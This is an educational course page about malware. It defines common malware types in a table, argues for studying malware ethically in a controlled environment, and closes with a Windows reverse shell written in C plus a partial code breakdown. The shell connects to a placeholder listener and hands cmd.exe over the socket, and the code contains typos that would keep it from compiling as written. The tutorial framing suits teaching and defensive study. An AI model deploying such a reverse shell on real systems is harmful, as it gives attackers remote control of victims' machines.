
![](https://i.imgur.com/gXusNNR.png)
## What the F&CK is Malware?

Malware is actually an abbreviation for **malicious software**. It is any software that is intentionally designed to cause damage, exploit, or disrupt systems, networks and/or devices. Malware can take a lot of different forms and serve a variety of purposes such as: stealing data, hijacking system resources, or enabling unauthorized access. Typically, malware is installed on the system secretly and if often delivered through deceptive techniques, like phishing, infected software, or exploits.
## Types of Malware

There are a lot of different types of malwares, we created a table of as many as we could think of. We will not be going into all these types of malware, but it is good to know the different types. It's worth noting that there are multiple different types of malware that are not on this list. We are sticking with the ones that are well known and do not have a controversy surrounding them.

| Type          | Description                                                                                                                                      | Examples                |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------- |
| `Worms`       | Spreads independently without the need of a host file or user interaction                                                                        | `Wannacry`              |
| `Trojans`     | Malicious software designed as legitimate programs to trick users into running it.                                                               | `Zbot`                  |
| `Ransomware`  | Encrypts files or locks users out of the system and demands a ransom to access the files/systems                                                 | `Lockbit`               |
| `Rootkits`    | A type of malware that provides admin access to a system while hiding it's presence                                                              | `2005 Sony BMG Rootkit` |
| `Bootkits`    | Type of rootkit that infects the MBR (Master Boot Record) this allows the malware to be loaded before the OS starts                              | `Mebromi`               |
| `Botnets`     | A collection of compromised computers/devices (zombies) remotely controller by an attack. Typically used for DDOS attacks.                       | `Mirai`                 |
| `Keyloggers`  | Records all the keystrokes that a user makes                                                                                                     | `SpyEye`                |
| `Stealers`    | Focuses on stealing certain information off a user's system, such as passwords, credit cards, personal information                               | `Emotet`                |
| `Polymorphic` | Changes its code or appearance after spreading, preventing detection from signature based detectors.                                             | `Storm worm`            |
| `Metamorphic` | Like polymorphic but changes the entire code base each iteration.                                                                                | `Simile`                |
| `RAT`         | Remote Access Trojan, or remote access tool. Used to provide the attacker with complete control of the system. Typically comes with a keylogger. | `DarkComet`             |
| `Logic Bomb`  | Malicious code that lies dormant until triggered with a specific condition                                                                       | `Farewell Dossier`      |
| `Data wipers` | Arguably the most destructive on the list. Is designed to completely destroy/corrupt the system                                                  | `Shamoon`               |
| `Dropper`     | Typically a small initial stage of a larger attack. Designed to covertly install other malware onto the system                                   | `Dridex`                |
## Why Write Malware?

It is important that I cannot legally tell you to go write malware and encourage you to deploy it and watch what it does. Writing malware comes with significant ethical and legal considerations. Being curios and wanting to learn more is natural and is why you are here reading this, but it is essential to channel that curiosity responsibly in a way that does not infringe on other people or cause them harm.

Your pursuit of knowledge is admirable, and you should never apologize for wanting to fully understand the information you encounter. When approached correctly, studying and writing malware will provide valuable insights and foster immense growth. It is crucial to do this in a controlled environment. 

If you get anything from this course, let it be this: curiosity is not a crime, but acing irresponsibly has serious consequences. There are several ethical reasons people learn to write malware:

- Understanding how it works
	- Providing a deeper technical knowledge of the inner workings of malware
	- Provides a better understanding of how to reverse engineer malware successfully
- Building better defenses
	- By understanding the techniques used by attackers, defenders can better defend.
	- Can provide better insight of how an attack occurred and provide easier patches
- Research and Development
	- Test defenses by researching new types of attacks
	- Provide better threat hunting by knowing what the malware does.

---
## Payload Deployment

Payloads are usually small pieces of code that execute specific actions once deployed on the target. They are usually (ethically) used in the context of penetration testing, or malware research.

- Reverse Shell
	- provides remote access to a system
- Data Exfil
	- extract information from the target
- Keylogging
	- record every keystroke done by the user of the target system
- System Manipulation
	- alter system settings, change/delete files

In this example we will be writing a basic reverse shell in C. This shell will connect to the system and provide us remote access to it:

```C
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main() {
  // init winsock
  WSADATA wsa;
  SOCKET s;
  struct sockaddr_in server;

  // set the variables to use IE: attacker IP to connect to and
  // port to connect to
  char *server_ip = "127.0.0.1";
  int server_port = 4444;

  // init Winsock
  WSAStartup(MAKEWORD(2,2), &wsa);

  // create the socket
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == INVALID_SOCKET) {
      WSACleanup();
      return 1;
  }

  // setup the server address struct
  server.sin_addr.s_addr = inet_addr(server_ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(server_port);

  // duplicate socket to stdin, stdout, stderr
  if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {   close socket(s);
    WSACleanup();
    return 1;
}
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  memset (&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = (STARTF_USESTDHANDLES | START F_USESWHOWINDOW);si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) s;

  // spawn the shell
  if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0) {
    closesocket(s);
    WSACleanup();
    return 1;
  }

  // wait for single object
  WaitForSingleObject(pi.hProcess, INFINITE);

  // cleanup
  closesocket(s);
  WSACleanup()
  return 0;
}
```
### Code Breakdown

- Winsock
	- Windows uses Winsock for networking, to use networking on Windows you will need to initialize Winsock.
- Socket Creation
	- A socket is created using the `socket` function. Specifying that it will use an IPv4 socket (`AF_NET`) and use TCP (`SOCK_STREAM`).
- Connection
	- The `connect` function is used to connect to the provided IP address. You will need to replace the IP and port to whatever is listening on your listener. 